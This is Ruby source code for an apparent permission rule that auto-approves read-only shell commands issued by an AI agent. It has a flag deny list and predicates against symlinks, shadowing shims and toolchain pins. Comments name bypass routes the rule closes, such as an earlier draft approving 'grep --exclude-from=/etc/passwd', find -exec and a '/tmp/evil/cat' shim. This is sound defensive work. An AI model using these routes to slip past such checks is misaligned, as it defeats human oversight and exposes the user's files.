        # Reads exactly its arguments WHEN NOT RECURSING. `-d` is disqualified
        # whole rather than only at `-d recurse`, since the value is a separate
        # word and reading it would be parsing options.
        #
        # All three `--exclude*` spellings are NAMED. An earlier draft named
        # `--exclude` alone and claimed it "covers all three" -- false, and
        # measured false: the matcher ran one way, and
        # `grep --exclude-from=/etc/passwd` was approved. The matcher is
        # symmetric now, which closes the class; listing them is what makes the
        # TABLE true without a reader having to reason about prefix semantics.
        "grep" => Flags.new(short: %w[r R f d],
                            long: %w[--recursive --dereference-recursive --directories
                                     --include --exclude --exclude-dir --exclude-from --file]),
        # Reads its arguments -- and, flagged, writes, executes, and reads
        # elsewhere. The only entry that can run a program of the caller's
        # choosing, and the reason the flag half of every entry exists.
        "sort" => Flags.new(short: %w[o T],
                            long: %w[--output --compress-program --files0-from
                                     --random-source --temporary-directory]),
        # Pure transforms. `cut -O` is an output DELIMITER and not a file, which
        # is worth saying because it reads like `sort -o`. `tr` opens no file at
        # all; `rev` opens exactly its arguments.
        "cut" => Flags.new,
        "tr" => Flags.new,
        "rev" => Flags.new,
        # Lists exactly its arguments, or the cwd -- until it recurses, or
        # follows a link to list what lies outside the words it was given.
        # Every option that takes a value is refused too, since a separate
        # value would otherwise read as a directory operand; the three with an
        # optional `=WHEN` go with them rather than be told apart.
        "ls" => Flags.new(short: %w[R L H I T w],
                          long: %w[--recursive --dereference --dereference-command-line
                                   --dereference-command-line-symlink-to-dir
                                   --block-size --format --hide --ignore --indicator-style --quoting-style
                                   --sort --tabsize --time --time-style --width
                                   --color --classify --hyperlink]),
        # Reads no file; `-L` and `-P` choose a spelling of the same directory.
        "pwd" => Flags.new,
        # Searches PATH for program names. `-i` and the two `--read-*` flags
        # read alias and function definitions from stdin.
        "which" => Flags.new(short: %w[i], long: %w[--read-alias --read-functions]),
        # `epic status` and `epic show` print only progress derived from the epic
        # home and its journals. `watch` is left out: it shows raw stored output,
        # which can hold secrets.
        "lain" => Subcommands.new([%w[epic status], %w[epic show]]),
        # Searches every file under a directory it is given, or the cwd when
        # given none -- the operand predicate requires named files. Only the
        # options listed take no value; every other is refused, those that run
        # a program, unpack, follow a link, unhide or list names among them.
        "rg" => Valueless.new(short: "nNiSswxvcloFHIbqUPap0",
                              long: %w[--line-number --no-line-number --ignore-case --smart-case --case-sensitive
                                       --word-regexp --line-regexp --invert-match --count --count-matches
                                       --files-with-matches --files-without-match --only-matching --fixed-strings
                                       --with-filename --no-filename --byte-offset --quiet --multiline --pcre2
                                       --null --column --no-heading --heading --vimgrep --trim --text --no-messages
                                       --json --pretty]),
        # Read subcommands only. Commit ids, subjects and counts print freely;
        # a file's name or bytes prints only where the git name predicate holds
        # it to the classifier, as `ls` and `find` are held, and a commit body
        # never does -- a history read that prints one is the judge's, with the
        # history fact it is told. The diff's own stat is the one list of names
        # left unchecked. Every global option is refused, `-c` and `-C` among
        # them, and so is every option that runs or writes; the repository
        # predicate reads the config git would. Output masking stays on behind
        # all of it: every bash result is masked whoever approved it.
        "git" => Printed::GIT,
        # Lists names, so the walk predicate holds its tree to what an `ls`
        # may print. Every action that runs, deletes or writes is refused, and
        # so is following a link.
        "find" => Primaries.new(%w[-exec -execdir -ok -okdir -delete -fprint -fprint0 -fprintf -fls
                                   -files0-from -follow]),
        "sed" => Prints.new,
        "sleep" => Pause.new,
        "true" => Flags.new,
        "false" => Flags.new,
        # Print exactly their words, which the other predicates have already
        # judged. A redirect or substitution never reaches here as a term.
        # `printf -v` assigns a shell variable in bash.
        "echo" => Flags.new,
        "printf" => Both.new(Flags.new(short: %w[v]), Narrow.new)
      }.freeze

      # Programs whose stage is approved only as exactly `[name, "--version"]`.
      # Closed, because `--version` is a convention and not a contract: a tool
      # off this list may read it as anything. `-V` is not accepted, since
      # `sort -V` and `ls -V` sort and some tools read it as verbose.
      #
      # ACCEPTED RISK, at the user's request: `rustc`, `cargo` and `rustup` are
      # usually rustup proxies, which choose a toolchain before they answer.
      # Accepted: the user's own default or `rustup override`, and a download
      # of one that is not installed. NOT accepted: a toolchain the checkout
      # pins in a `rust-toolchain` file, whose `path` key runs whatever binary
      # the checkout names -- {RUSTUP_PROXIES} refuse under one.
      #
      # No interpreter is here: the shell verdict refuses a program that runs
      # what its arguments name, so no term for one ever reaches this rule.
      VERSION_PROBES = %w[rustc cargo rustup dx adb go gcc clang cmake].freeze

      # Answers {Flags#admits?}, so the flags predicate stays one lookup.
      class VersionProbe
        def admits?(arguments) = arguments == [VERSION]
      end
      private_constant :VersionProbe

      VERSION_PROBE = VersionProbe.new.freeze
      private_constant :VERSION_PROBE

      PROGRAM_LOOKUP = "which"
      LISTER = "ls"
      DOT = "."
      # Matched as {Flags} match, so an abbreviation or a bundle counts too.
      SHOWS_DOT_ENTRIES = Flags.new(short: %w[a A], long: %w[--all --almost-all])
      CURRENT = "."

      SEARCHER = "rg"
      FINDER = "find"
      GIT = "git"
      # The most entries a `find` may reach before this rule stops walking and
      # leaves it to the judge: each is classified, on every judged call.
      WALK_BOUND = 1000
      MAX_DEPTH = "-maxdepth"
      FIND_START = "-P"

      RUSTUP_PROXIES = %w[rustc cargo rustup].freeze
      # rustup looks for both, from `getcwd` upward -- the REAL cwd.
      TOOLCHAIN_FILES = %w[rust-toolchain rust-toolchain.toml].freeze

      # @param sensitivity [#call, #confinement, #content] `cwd -> #classify`, a
      #   {Sensitivity} FACTORY rather than one classifier: a bash call names its
      #   own working directory, and a classifier built at wiring time would
      #   anchor a relative word under whatever directory the agent started in --
      #   approving `cat config` from inside `.git`. Its `#confinement(cwd)`
      #   answers the root predicate from the same resolution of that cwd, so
      #   the two cannot disagree about where a relative word lands, and it must
      #   fail CLOSED where `#call` falls back. Its `#content(cwd)` answers the
      #   content predicate over that same resolution, and fails closed too.
      #
      #   REQUIRED, with no Null default, on the ladder's `faults:` precedent:
      #   a permissive default is how a guard ships green forever, and a rule
      #   that APPROVES, handed a classifier protecting nothing, would approve
      #   every path there is.
      #
      #   It must be TOTAL, for the security reason {Escalation::Triage} states
      #   at length about the same seam. Measured, the failure direction here is
      #   at least safe: a raise reaches the rules {Ladder} as a fault, and its edge
      #   suppresses the allow ({Ladder::Poisoning}). Under `classes:` it
      #   also answers `#executables(term, cwd)`, one resolved stage per stage.
      # @param classes [Boolean] whether predicate 12 rules; off, the bench arm's
      #   baseline, approves by name as before it existed
      # @param git [#names, #trees?, #hooked?] what git says a stage would print, for predicate 16
      # @param facts [#file?, #exist?, #symlink?] the disk predicate 16 reads
      def initialize(sensitivity:, classes: false, git: Listing, facts: FileFacts::LIVE)
        super()
        @sensitivity = sensitivity
        @classes = classes
        @git = git
        @facts = facts
        freeze
      end

      # @param call [Rule::Call]
      # @return [Rule::Decision, nil] an allow, or nil for every other command
      def decide(call)
        # Predicate 2: the verdict allowed, or abstained and {Shell::Reading}
        # read the string. A deny is never read again, and a session excluding
        # a program makes the verdict a DENY, which is how an exclusion outranks
        # the allowlist without this rule knowing the exclusion table exists.
        return nil unless judged?(call)

        term, cwd = read(call)
        return nil unless term && approvable?(call, term, cwd)

        names = vouched_names(call, term, cwd)
        names && allow(call, because: format(APPROVED, programs: names.join(", ")))
      end

      # @param call [Rule::Call]
      # @return [String, nil] which binary stopped the class predicate, once every
      #   other predicate held; nil where this rule would have decided or never judges
      def why_not(call)
        term, cwd = read(call) if @classes && judged?(call)
        return nil unless term && explainable?(call, term, cwd)

        stages = executables(call, term, cwd)
        suspect = stages.flat_map(&:programs).find { !trusted?(_1) } if stages
        suspect && describe_binary(suspect)
      end

      private

      # Once per call, for {#decide} and {#why_not} both: {Rule::Call#term}
      # parses again on every ask. A deny is a decision the session made, so
      # only an abstention is read again.
      def read(call) = call.memo([self, :read]) { verdict_read(call) }

      def verdict_read(call)
        return unless call.tool.respond_to?(:decision_for)

        decision = call.tool.decision_for(call.input)
        return [decision.term, call.input.cwd] if decision.allow?

        Shell::Reading.of(call.input.command, call.input.cwd) if decision.abstain?
      end

      # THE CONJUNCTION. Each predicate is total over a term by itself, so the
      # order is short-circuiting for cost and for nothing else, and another
      # goes here plus one method below.
      def approvable?(call, term, cwd)
        bare_names?(term) && allowlisted?(term) && unflagged?(term) && vouched?(call, term, cwd)
      end

      # Once per call: the walk and the repository read are paid in {#decide}
      # and asked again by {#why_not}.
      def vouched?(call, term, cwd) = call.memo([self, :vouched]) { vouchable?(term, cwd) }

      # Everything but the name and flag predicates, which no flag table can
      # answer for a path-named program, so one that only the class predicate
      # stopped can still be explained.
      def vouchable?(term, cwd)
        ordinary_words?(term, cwd) && unaliased?(term) && confined?(term, cwd) &&
          plain_content?(term, cwd) && resolved_words?(term, cwd) &&
          unpinned?(term, cwd) && unrevealing?(term, cwd) && searched_files?(term, cwd) &&
          walkable?(term, cwd) && quiet_repository?(term, cwd) && git_named?(term, cwd)
      end

      def explainable?(call, term, cwd) = flags_ok_where_listed?(term) && vouched?(call, term, cwd)

      def flags_ok_where_listed?(term)
        term.stages.all? do |stage|
          program, *arguments = stage.argv
          !listed?(program) || flags_for(program).admits?(arguments)
        end
      end

      def listed?(program) = PROGRAMS.key?(program) || VERSION_PROBES.include?(program)

      def judged?(call) = call.tool_name == TOOL

      # Compared WHOLE and never basenamed. `Doubts#programs` basenames, which
      # is right for the exclusion set and would let `/tmp/evil/cat` match the
      # entry for `cat` here.
      def bare_names?(term) = programs(term).none? { |program| program.include?(SEPARATOR) }

      def allowlisted?(term)
        programs(term).all? { listed?(_1) }
      end

      def ordinary_words?(term, cwd)
        classifier = @sensitivity.call(cwd)
        term.words.all? { |word| unexempted?(classifier.classify(word)) }
      end

      def unexempted?(verdict) = verdict.ordinary? && !verdict.exempt?

      def unflagged?(term)
        term.stages.all? do |stage|
          program, *arguments = stage.argv
          flags_for(program).admits?(arguments)
        end
      end

      def flags_for(program)
        PROGRAMS.fetch(program) { VERSION_PROBES.include?(program) ? VERSION_PROBE : UNLISTED }
      end

      # Predicate 6, and the shape every later rung copies: one method over the
      # term alone, total by itself, reached by one more `&&` above.
      def unaliased?(term) = term.words.none? { |word| word.match?(ALIASING) }

      # The root predicate. The factory folds the call's own cwd into the
      # answer: a cwd outside the root confines nothing, so no word passes.
      def confined?(term, cwd)
        confinement = @sensitivity.confinement(cwd)
        term.words.all? { |word| confinement.contains?(word) }
      end

      # The content predicate. The only one that opens a file, and that is the
      # only reason for its place: the factory answers it over its own root
      # answer.
      def plain_content?(term, cwd)
        content = @sensitivity.content(cwd)
        term.words.all? { |word| content.admits?(word) }
      end

      # The landing predicate. Predicate 4 classified the word as written; this
      # classifies what it resolves to, so a link cannot carry a gated file in
      # under an ordinary name.
      def resolved_words?(term, cwd)
        classifier = @sensitivity.call(cwd)
        confinement = @sensitivity.confinement(cwd)
        landing_words(term).all? { |word| ordinary_landing?(classifier, confinement, word) }
      end

      def landing_words(term) = term.stages.flat_map { |stage| landed(stage) }

      def landed(stage) = stage.program == PROGRAM_LOOKUP ? looked_up_paths(stage) : stage.argv

      # A word with a `/` given to `which` is still the path it reads as.
      def looked_up_paths(stage) = [stage.program, *stage.argv.drop(1).select { |word| word.include?(SEPARATOR) }]

      # Both spellings of the landing, for the reason the header gives, and
      # false for a word that resolves nowhere: `#landing_of` raises where no
      # prefix is on disk, and a raise here would reach the rules {Ladder} as a fault
      # rather than as the refusal it means.
      #
      # The base the relative spelling is measured from is the confinement's own
      # `#real_landing` -- one resolution per decision, which the factory had to
      # make anyway, rather than one per word.
      def ordinary_landing?(classifier, confinement, word)
        ordinary_spellings?(classifier, confinement, confinement.landing_of(word))
      rescue StandardError
        false
      end

      def ordinary_spellings?(classifier, confinement, absolute)
        relative = Pathname.new(absolute).relative_path_from(confinement.real_landing).to_s
        [absolute, relative].all? { |spelling| unexempted?(classifier.classify(spelling)) }
      end

      # The toolchain predicate. False where the cwd resolves nowhere, which is
      # the direction the root predicate already fails in.
      def unpinned?(term, cwd)
        return true unless term.programs.intersect?(RUSTUP_PROXIES)

        Pathname.new(@sensitivity.confinement(cwd).landing_of(CURRENT)).ascend.none? { |directory| pins?(directory) }
      rescue StandardError
        false
      end

      # A dangling link counts: refusing costs a prompt, and rustup's reading
      # of one is not this rule's to predict.
      def pins?(directory)
        TOOLCHAIN_FILES.any? { |name| File.exist?(directory.join(name)) || File.symlink?(directory.join(name)) }
      end

      # The listing predicate. One level deep, because the flags predicate
      # already refuses a listing that recurses.
      def unrevealing?(term, cwd) = held_where?(term, cwd, LISTER) { |*parts| Listed.new(*parts) }

      # `ls` prints no dot entry unless a flag asks for them. The cwd stands in
      # when no operand is a directory, so a word misread as an operand cannot
      # leave the cwd unjudged.
      class Listed
        # @param arguments [Array<String>] the stage's argv after `ls`
        # @param confinement [#landing_of] where the call's words land
        # @param entry [#call] `absolute path -> Boolean`, the `ls` entry predicate
        def initialize(arguments, confinement, entry)
          @arguments = arguments
          @confinement = confinement
          @entry = entry
        end

        def held?
          dots = !SHOWS_DOT_ENTRIES.admits?(@arguments)
          directories.all? { |directory| printed_entries(directory, dots).all? { @entry.call(_1) } }
        end

        private

        def directories
          found = Operands.of(@arguments).map { |word| @confinement.landing_of(word) }
                          .select { |landing| File.directory?(landing) }
          found.empty? ? [@confinement.landing_of(CURRENT)] : found
        end

        def printed_entries(directory, dots)
          entries = Dir.children(directory)
          shown = dots ? entries : entries.reject { |entry| entry.start_with?(DOT) }
          shown.map { |entry| File.join(directory, entry) }
        end
      end
      private_constant :Listed

      # Every word after `--` is an operand, as getopt reads it.
      module Operands
        def self.of(arguments)
          options = arguments.take_while { |word| word != LONG }
          options.reject { |word| word.start_with?(DASH) } + arguments.drop(options.size + 1)
        end
      end
      private_constant :Operands

      # A link's landing counts though a plain `ls` prints only its name: `-l`
      # prints the target, and the parked prompt costs less than telling them apart.
      # Only a link has a landing of its own: every entry sits in a directory
      # already resolved, so any other entry lands where it is named, and
      # resolving it again was most of a `find` walk's cost.
      def ordinary_entry?(classifier, confinement, path)
        ordinary_spellings?(classifier, confinement, path) &&
          (!File.symlink?(path) || ordinary_landing?(classifier, confinement, path))
      end

      # Every stage of one program, held to what it prints by the policy the
      # block builds from its arguments, the confinement and the `ls` entry
      # predicate. A raise refuses.
      def held_where?(term, cwd, program)
        classifier = @sensitivity.call(cwd)
        confinement = @sensitivity.confinement(cwd)
        entry = ->(path) { ordinary_entry?(classifier, confinement, path) }
        term.stages.select { |stage| stage.program == program }
            .all? { |stage| yield(stage.argv.drop(1), confinement, entry).held? }
      rescue StandardError
        false
      end

      # The operand predicate. The first word that is not an option is the
      # pattern and the rest are files -- true only because `rg`'s table admits
      # no option that takes a value, which is what makes the slots certain.
      def searched_files?(term, cwd)
        confinement = @sensitivity.confinement(cwd)
        term.stages.select { |stage| stage.program == SEARCHER }
            .all? { |stage| named_files?(Operands.of(stage.argv.drop(1)).drop(1), confinement) }
      end

      def named_files?(words, confinement)
        words.any? && words.all? { |word| File.file?(confinement.landing_of(word)) }
      rescue StandardError
        false
      end

      # The walk predicate. Bounded, so a large tree is the judge's rather than
      # a cost on every call; never through a link, as find does not follow one.
      def walkable?(term, cwd) = held_where?(term, cwd, FINDER) { |*parts| Walked.new(*parts) }

      # A `find` reaching at most {WALK_BOUND} entries, each an ordinary `ls` entry.
      class Walked
        # @param arguments [Array<String>] the stage's argv after `find`
        # @param confinement [#landing_of] where the call's words land
        # @param entry [#call] `absolute path -> Boolean`, the `ls` entry predicate
        def initialize(arguments, confinement, entry)
          @arguments = arguments
          @confinement = confinement
          @entry = entry
        end

        def held?
          depth = max_depth
          starts = start_points.map { |word| @confinement.landing_of(word) }
          entries = Tree.new(starts, depth:, bound: WALK_BOUND).first(WALK_BOUND + 1) if depth
          entries && entries.size <= WALK_BOUND && entries.all? { @entry.call(_1) }
        end

        private

        def start_points
          words = @arguments.drop_while { |word| word == FIND_START }.take_while { |word| !word.start_with?(DASH) }
          words.empty? ? [CURRENT] : words
        end

        # One that is not a number bounds nothing. GNU find obeys the last of
        # several and warns, so more than one is not read: nil.
        def max_depth
          depths = @arguments.each_cons(2).select { |option, _| option == MAX_DEPTH }
                             .map { |_, value| Integer(value, exception: false) || Float::INFINITY }
          depths.size > 1 ? nil : depths.first || Float::INFINITY
        end
      end
      private_constant :Walked

      # Every entry under each start point, breadth first, the start included.
      class Tree
        include Enumerable

        # @param starts [Array<String>] absolute
        # @param depth [Numeric] how many levels below a start to read
        # @param bound [Integer] past this many entries a directory is read no further
        def initialize(starts, depth:, bound:)
          @starts = starts
          @depth = depth
          @bound = bound
        end

        def each
          queue = @starts.map { [_1, 0] }
          until queue.empty?
            path, level = queue.shift
            yield path
            queue.concat(children(path).map { [_1, level + 1] }) if level < @depth
          end
        end

        private

        # One past the bound is enough to know a walk is over it, so a large
        # directory is not read whole.
        def children(path)
          File.lstat(path).directory? ? Dir.each_child(path).first(@bound + 1).map { File.join(path, _1) } : []
        end
      end
      private_constant :Tree

      # The repository predicate. The repository is the one git finds from where
      # the stage runs; the user's own config, global and system, is trusted.
      def quiet_repository?(term, cwd)
        return true unless term.programs.include?(GIT)

        Repository.quiet?(@sensitivity.confinement(cwd).landing_of(CURRENT))
      rescue StandardError
        false
      end

      # The git name predicate, after the repository predicate, since a status
      # or ls-files asks git what it would print; a printed name must also lie
      # inside the root.
      def git_named?(term, cwd)
        held_where?(term, cwd, GIT) do |arguments, confinement, entry|
          ordinary = ->(path) { confinement.contains?(path) && entry.call(path) }
          Printed.new(arguments, confinement.landing_of(CURRENT), ordinary, git: @git, facts: @facts)
        end
      end

      def programs(term) = term.programs

      # One resolution answers both the predicate and the reason, so the reason
      # names the file that was judged. A raise abstains, as the other
      # predicates' rescues do.
      def vouched_names(call, term, cwd)
        return programs(term) unless @classes

        stages = executables(call, term, cwd)
        stages.map { |stage| "#{stage.name} at #{stage.resolved} (#{stage.klass})" } if stages.all? { trusted?(_1) }
      rescue StandardError
        nil
      end

      def executables(call, term, cwd)
        call.memo(self) { @sensitivity.executables(term, cwd) }
      end

      def describe_binary(binary)
        return "#{binary.name} did not resolve to a file" if binary.klass == :unresolved

        ["#{binary.name} resolved to #{binary.resolved} (#{binary.klass})",
         ("shadowing #{binary.shadowed.join(", ")}" if binary.shadowed.any?),
         ("written this session" if binary.fresh),
         *unexplained_anomalies(binary).map { "with a #{_1.to_s.tr("_", " ")}" }].compact.join(", ")
      end

      # A project binary already says it is on a project PATH entry.
      def unexplained_anomalies(binary)
        binary.klass == :project ? binary.anomalies - [:project_path_entry] : binary.anomalies
      end

      def trusted?(stage)
        trusted_class?(stage.klass, stage.fresh) && stage.anomalies.empty? && !user_shadowing?(stage) &&
          stage.wrappers.all? { |wrapper| trusted?(wrapper) } &&
          stage.run_files.all? { |file| trusted_class?(file.klass, file.fresh) }
      end

      # A user file is one this process could have swapped, so it is trusted
      # only while nothing in this lineage has changed it.
      def trusted_class?(klass, fresh) = klass == :system || (klass == :user && !fresh)

      # A shim planted in an earlier session is no longer fresh, so standing in
      # front of another program of the same name is what gives it away.
      def user_shadowing?(stage) = stage.klass == :user && stage.shadowed.any?
    end
  end
end
